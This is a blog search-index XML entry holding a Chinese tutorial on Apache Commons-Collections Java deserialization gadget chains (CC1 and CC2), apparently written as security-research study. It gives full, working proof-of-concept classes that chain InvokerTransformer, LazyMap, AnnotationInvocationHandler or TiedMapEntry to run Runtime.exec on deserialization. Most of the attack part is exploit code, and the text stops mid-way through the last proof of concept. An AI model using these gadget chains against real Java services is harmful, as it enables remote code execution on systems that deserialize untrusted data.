<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Commons-Collections反序列化链合集</title>
      <link href="/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/"/>
      <url>/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Commons-Collections利用链合集"><a href="#Commons-Collections利用链合集" class="headerlink" title="Commons-Collections利用链合集"></a>Commons-Collections利用链合集</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ol><li><p>java反射</p></li><li><p>javassist</p></li><li><p>动态代理</p></li><li><p>JVM类加载机制</p></li></ol><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>版本：<strong>cc3.1～3.2.1</strong></p><p>jdk: &lt; 8u71</p><p>环境搭建：</p><pre><code class="xml">&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;commons-collections&lt;/groupId&gt;            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;            &lt;version&gt;3.1&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;</code></pre><p>对比官方在3.2.2版本<a href="https://github.com/apache/commons-collections/commit/1642b00d67b96de87cad44223efb9ab5b4fb7be5">https://github.com/apache/commons-collections/commit/1642b00d67b96de87cad44223efb9ab5b4fb7be5</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230727153329622.png" alt="image-20230727153329622"></p><pre><code>默认情况下禁用“InvokerTransformer”的反序列化，因为可用于远程代码执行攻击。 要重新启用具有系统属性“org.apache.commons.collections.invokertransformer.enableDeserialization”需要设置为“true”</code></pre><p>说明漏洞存在于<code>InvokerTransformer</code>这个类</p><p>在这个类里面存在一个<code>transform</code>方法</p><pre><code class="java">public Object transform(Object input) &#123;        if (input == null) &#123;            return null;        &#125; else &#123;            try &#123;                Class cls = input.getClass();                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);                return method.invoke(input, this.iArgs);            &#125; catch (NoSuchMethodException var5) &#123;                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);            &#125; catch (IllegalAccessException var6) &#123;                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);            &#125; catch (InvocationTargetException var7) &#123;                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);            &#125;        &#125;    &#125;</code></pre><p>可以看到这里利用了java反射，可以利用反射调用任意类的任意方法，比如通过反射执行系统命令</p><pre><code class="java">//Runtime.class可序列化，Runtime⽆法序列化Class c =Runtime.class;Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);Runtime r = (Runtime) getRuntime.invoke(null, null);Method exec = c.getMethod(&quot;exec&quot;, String.class);exec.invoke(r,&quot;calc&quot;);</code></pre><p>现在需要知道参数<code>this.iMethodName</code>,<code>this.iParamTypes</code>,<code>this.iArgs</code>是如何传递的</p><p>这个类的构造方法如下：</p><pre><code class="java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;        this.iMethodName = methodName;        this.iParamTypes = paramTypes;        this.iArgs = args;    &#125;</code></pre><p>这三个参数在构造方法中直接赋值，从赋值到反射，没有任何过滤或限制</p><p>可以将上面反射执行系统命令的代码修改为：</p><pre><code class="java">Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code></pre><p>然后就是找链子，直到找到readObject()</p><p>找一个调用了transform()的方法<code>org.apache.commons.collections.functors.ChainedTransformer.class#transform()</code></p><pre><code class="java">public Object transform(Object object) &#123;        for (int i = 0; i &lt; iTransformers.length; i++) &#123;            object = iTransformers[i].transform(object);        &#125;        return object;    &#125;</code></pre><p>按顺序调用 Transformer 数组 this.iTransformers 中所有 Transformer 对象的 transform 方法，并且每次调用的结果传递给下一个 Transformer#transform() 作为参数</p><p>利用它我们可以构造 Transformer 数组 通过 ChainedTransformer#transform() 的链式调用机制+java的反射机制在反序列化时构造出 Runtime 对象</p><p>这个类的构造函数：</p><pre><code class="java">public ChainedTransformer(Transformer[] transformers) &#123;        super();        iTransformers = transformers;    &#125;</code></pre><p>然后就可以构造下面代码执行命令了：</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        chainedTransformer.transform(Class.class);</code></pre><p>调用 transform() 方法是参数可控，因为链式调用的起点 为 class对象(Class.class)，是我们传入 transform() 方法的参数。这样条件有些苛刻了，即使参数可控，参数类型也对不上。继续想办法减少条件。</p><p>找到<code>org.apache.commons.collections.functors.ConstantTransformer</code>,看看它是如何实现transform的</p><pre><code class="java">public ConstantTransformer(Object constantToReturn) &#123;        super();        iConstant = constantToReturn;    &#125;public Object transform(Object input) &#123;        return iConstant;    &#125;</code></pre><p>前边使用 ChainedTransformer#transform() 方法链式调用的起点是传入 transform() 方法的参数，也就是 class 对象(Class.class)。可以用 ConstantTransformer 包裹一个 class 对象,把它放到我们构造的 Transformer 数组的首位，作为链式调用的起点。</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        chainedTransformer.transform(&#39;s&#39;);</code></pre><h3 id="lt-8u71"><a href="#lt-8u71" class="headerlink" title="&lt; 8u71"></a>&lt; 8u71</h3><p>找另外一个调用了transform()的方法，这里找到了<code>org/apache/commons/collections/map/LazyMap.java</code>的get()方法</p><pre><code class="java">public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>检查给定的键 <code>key</code> 是否已经存在于 <code>map</code> 中，通过调用 <code>map.containsKey(key)</code> 方法来判断。如果键不存在 (<code>== false</code>)，则进入if语句，调用<code>transform()</code></p><p>其中key是方法参数，可控，然后就是factory,跟踪factory属性的赋值，查看构造函数</p><pre><code class="java">protected LazyMap(Map map, Transformer factory) &#123;        super(map);        if (factory == null) &#123;            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);        &#125;        this.factory = factory;    &#125;</code></pre><p>但是这个类的构造函数是<code>protected</code>类型，只有他自身或者继承他的类可以用,那就是<code>decorate()</code>方法</p><pre><code class="java">public static Map decorate(Map map, Transformer factory) &#123;        return new LazyMap(map, factory);    &#125;</code></pre><p>所以接着上面简单构造一下又能执行命令了</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);        lazymap.get(&#39;s&#39;);</code></pre><p>下一步要找到一个调用get()方法的地方，最好能找到一个重写readObject的类并且在这个readObject里面调用了get的方法</p><p>然后找到了<code>AnnotationInvocationHandler</code>这个类</p><pre><code class="java">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;        ObjectInputStream.GetField var2 = var1.readFields();        Class var3 = (Class)var2.get(&quot;type&quot;, (Object)null);        Map var4 = (Map)var2.get(&quot;memberValues&quot;, (Object)null);        AnnotationType var5 = null;        try &#123;            var5 = AnnotationType.getInstance(var3);        &#125; catch (IllegalArgumentException var13) &#123;            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);        &#125;        Map var6 = var5.memberTypes();        LinkedHashMap var7 = new LinkedHashMap();        String var10;        Object var11;        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;            Map.Entry var9 = (Map.Entry)var8.next();            var10 = (String)var9.getKey();            var11 = null;            Class var12 = (Class)var6.get(var10);            if (var12 != null) &#123;                var11 = var9.getValue();                if (!var12.isInstance(var11) &amp;&amp; !(var11 instanceof ExceptionProxy)) &#123;                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + &quot;[&quot; + var11 + &quot;]&quot;)).setMember((Method)var5.members().get(var10));                &#125;            &#125;        &#125;        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);    &#125;</code></pre><p>AnnotationInvocationHandler 类的 readObject 方法中并没有直接调用到 Map 的 get 方法，但是在 AnnotationInvocationHandler#invoke() 方法调用了 get 方法，this.memberValues 可控。</p><pre><code class="java">public Object invoke(Object var1, Method var2, Object[] var3) &#123;        String var4 = var2.getName();        Class[] var5 = var2.getParameterTypes();        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;            return this.equalsImpl(var3[0]);        &#125; else if (var5.length != 0) &#123;            throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);        &#125; else &#123;            switch (var4) &#123;                case &quot;toString&quot;:                    return this.toStringImpl();                case &quot;hashCode&quot;:                    return this.hashCodeImpl();                case &quot;annotationType&quot;:                    return this.type;                default:                    Object var6 = this.memberValues.get(var4);                    if (var6 == null) &#123;                        throw new IncompleteAnnotationException(this.type, var4);                    &#125; else if (var6 instanceof ExceptionProxy) &#123;                        throw ((ExceptionProxy)var6).generateException();                    &#125; else &#123;                        if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != 0) &#123;                            var6 = this.cloneArray(var6);                        &#125;                        return var6;                    &#125;            &#125;        &#125;    &#125;</code></pre><p>这个类的构造方法如下：this.memberValues 可控，设置 this.memberValues 为我们构造的 LazyMap，但是这里存在一个if判断，第一个参数类型必须是注解</p><pre><code class="java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;        Class[] var3 = var1.getInterfaces();        if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;            this.type = var1;            this.memberValues = var2;        &#125; else &#123;            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);        &#125;    &#125;</code></pre><p>下一步就要想如何调用这个<code>invoke</code>方法</p><p>这部分涉及到 java 的动态代理。创建一个 AnnotationInvocationHandler 的代理类，当调用 AnnotationInvocationHandler 的代理类里的任意方法时都会先调用 AnnotationInvocationHandler#invoke() 方法，有点像php里的 _call() 只不过 _call() 在调用不存在的方法才触发</p><p>动态代理参考：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</a></p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        //实例一个 AnnotationInvocationHandler 类        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);//获取指定参数类型的构造函数        construct.setAccessible(true);        //这里第一个参数必须是注释类型的        InvocationHandler handler = (InvocationHandler) construct.newInstance(Repeatable.class, lazymap);        // 创建 AnnotationInvocationHandler 的代理        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);        //调用代理对象的任意方法        proxyMap.size();</code></pre><p>这里可以调用任意方法触发，只要找到一个readObject有对我们的代理对象调用任意方法就行，按照ysoserial中的链子，后面使用的是AnnotationInvocationHandler的readObject方法</p><p>(这里懵逼了)这里需要再实例化一个AnnotationInvocationHandler 包裹的代理对象 proxyMap</p><pre><code class="java">handler = (InvocationHandler) construct.newInstance(Repeatable.class, proxyMap);</code></pre><p>链子如下：</p><pre><code class="mermaid">graph TBsun.reflect.annotation.AnnotationInvocationHandler#\nreadObject--&gt;sun.reflect.annotation.AnnotationInvocationHandler#\ninvokesun.reflect.annotation.AnnotationInvocationHandler#\ninvoke--&gt;org.apache.commons.collections.map.LazyMap#\ngetorg.apache.commons.collections.map.LazyMap#\nget--&gt;org.apache.commons.collections.functors.ChainedTransformer#\ntransformorg.apache.commons.collections.functors.ChainedTransformer#\ntransform--&gt;org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransformorg.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform--&gt;Runtime.getRuntime.exec</code></pre><p>最后的POC</p><pre><code class="java">package TTT;import java.io.*;import java.lang.annotation.Repeatable;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;public class cc1 &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        //实例一个 AnnotationInvocationHandler 类        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);//获取指定参数类型的构造函数        construct.setAccessible(true);        //这里第一个参数必须是注释类型的        InvocationHandler handler = (InvocationHandler) construct.newInstance(Repeatable.class, lazymap);        // 创建 AnnotationInvocationHandler 的代理        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);        //调用代理对象的任意方法//        proxyMap.size();        // 再实例化一个 AnnotationInvocationHandler 包裹的代理对象 proxyMap        handler = (InvocationHandler) construct.newInstance(Repeatable.class, proxyMap);        serialize(handler);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h3 id="gt-8u71"><a href="#gt-8u71" class="headerlink" title="&gt; 8u71"></a>&gt; 8u71</h3><p>在java 8u71以后，AnnotationInvocationHandler的readObject的逻辑变化了，利用不了，所以我们如果想要在高版本执行，必须要找一条新的链</p><p>调用get()方法之前的代码是一样的：</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);        lazymap.get(&#39;s&#39;);</code></pre><p>上面是使用了<code>AnnotationInvocationHandler#invoke()</code>里面调用了<code>get()</code></p><p>这条链使用的是org.apache.commons.collections.keyvalue.TiedMapEntry的<code>getValue</code></p><pre><code class="java">public TiedMapEntry(Map map, Object key) &#123;        super();        this.map = map;        this.key = key;    &#125;public Object getValue() &#123;        return map.get(key);    &#125;</code></pre><p>下一步找调用了<code>getValue()</code>的地方</p><p>就在这个类下就有：</p><pre><code class="java">public int hashCode() &#123;        Object value = getValue();        return (getKey() == null ? 0 : getKey().hashCode()) ^               (value == null ? 0 : value.hashCode());     &#125;</code></pre><p>修改poc:</p><pre><code class="java">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);        tiedmapentry.hashCode();</code></pre><p>如何调用<code>hashCode()</code></p><p>在<code>java.util.HashMap</code>, 可以构造<code>hash(tiedmapentry)</code></p><pre><code class="java">static final int hash(Object key) &#123;        int h;        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);    &#125;</code></pre><p>但是hash方法不是public类型，只能内部调用</p><p>在内部找到<code>readObject</code>,刚好可以结束链子</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)        throws IOException, ClassNotFoundException &#123;....for (int i = 0; i &lt; mappings; i++) &#123;                @SuppressWarnings(&quot;unchecked&quot;)                    K key = (K) s.readObject();                @SuppressWarnings(&quot;unchecked&quot;)                    V value = (V) s.readObject();                putVal(hash(key), key, value, false, false);            &#125;&#125;</code></pre><p>key的来源是map对象</p><p>链子如下:</p><pre><code class="mermaid">graph TBjava.util.HashMap#\nreadObject--&gt;java.util.HashMap#\nhashjava.util.HashMap#\nhash--&gt;org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCodeorg.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode--&gt;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValueorg.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue--&gt;org.apache.commons.collections.map.LazyMap#\ngetorg.apache.commons.collections.map.LazyMap#\nget--&gt;org.apache.commons.collections.functors.ChainedTransformer#\ntransformorg.apache.commons.collections.functors.ChainedTransformer#\ntransform--&gt;org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransformorg.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform--&gt;Runtime.getRuntime.exec</code></pre><p>最后的POC</p><pre><code class="java">package TTT;import java.io.*;import java.lang.annotation.Repeatable;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import java.util.HashMap;public class cc1 &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.hashCode();        Map expMap=new HashMap();        expMap.put(tiedmapentry,&quot;valuevalue&quot;);        serialize(expMap);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>版本：commons-collections4: 4.0</p><p>jdk:1.7或1.8低版本</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;      &lt;version&gt;4.0&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>经过测试，上面CC1中的那两条链子还是存在的，但是需要修改一下，因为这个cc版本的LazyMap类变了，给构造函数传参的方式变了</p><p>只有修改LazyMap部分即可</p><p>修改后的poc:</p><p>&lt;8u71</p><pre><code class="java">package org.example;import org.apache.commons.collections4.*;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import org.apache.commons.collections4.map.LazyMap;import java.io.*;import java.lang.annotation.Repeatable;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class App&#123;    public static &lt;K,V&gt; void main(String[] args ) throws IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap();        LazyMap&lt;K, V&gt; lazymap = LazyMap.lazyMap(map, chainedTransformer);//        lazyMap.get(&#39;s&#39;);//实例一个 AnnotationInvocationHandler 类        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);//获取指定参数类型的构造函数        construct.setAccessible(true);        //这里第一个参数必须是注释类型的        InvocationHandler handler = (InvocationHandler) construct.newInstance(Repeatable.class, lazymap);        // 创建 AnnotationInvocationHandler 的代理        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);        //调用代理对象的任意方法//        proxyMap.size();        // 再实例化一个 AnnotationInvocationHandler 包裹的代理对象 proxyMap        handler = (InvocationHandler) construct.newInstance(Repeatable.class, proxyMap);        serialize(handler);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><p>8u71</p><pre><code class="java">package org.example;import org.apache.commons.collections4.*;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import org.apache.commons.collections4.map.LazyMap;import java.io.*;import java.util.HashMap;import java.util.Map;public class App&#123;    public static &lt;K,V&gt; void main(String[] args ) throws IOException, ClassNotFoundException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap();        LazyMap&lt;K, V&gt; lazymap = LazyMap.lazyMap(map, chainedTransformer);//        lazyMap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.hashCode();        Map expMap=new HashMap();        expMap.put(tiedmapentry,&quot;valuevalue&quot;);        serialize(expMap);        